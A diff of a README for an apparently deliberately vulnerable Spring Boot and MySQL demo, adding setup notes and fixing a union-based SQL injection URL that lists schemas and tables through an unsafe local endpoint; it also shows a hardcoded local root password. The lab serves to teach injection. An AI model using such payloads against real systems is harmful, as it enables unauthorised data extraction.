@@ -23,13 +23,20 @@ Run docker
 
 ### Run the application
 
+    Use IDEA to run the application, as then configuration works with DB correctly.
+    
+![img.png](img.png)
+
+NOTE: When using maven start - it doesn't work (DB works, but the app doesn't see all tables in a proper manner).
     cd ../../
     ./mvnw spring-boot:run
+
+
     
 ### Connect to mySql
 To connect to mySql use
 
-    Open terminal and run "mysql -h 127.0.0.1 -P 3307 -uroot -p11asd097asd"  
+    Open terminal and run " docker exec -it local-mysql mysql -h 127.0.0.1 -P 3307 -uroot -p11asd097asd"  
     
     Feel free to inspect mySql content:
     mysql> "show schemas;"
@@ -57,7 +64,7 @@ Simple SQLi
 
 Union based SQLi to get table_schema,table_name FROM information_Schema.tables
     
-    http://localhost:8080/filterUserGlobalAccessUnSafe?name=Bilbo'union all select 1, concat(table_schema,'-----', table_name), table_name, 'STAFF'   from information_Schema.tables where '1'='1
+    http://localhost:8080/filterUserGlobalAccessUnSafe?name=Bilbo' union all select 1, concat(table_schema,'-----', table_name), table_name, 'STAFF'   from information_Schema.tables where '1'='1
 
 
 Union based SQLi to get data from any table
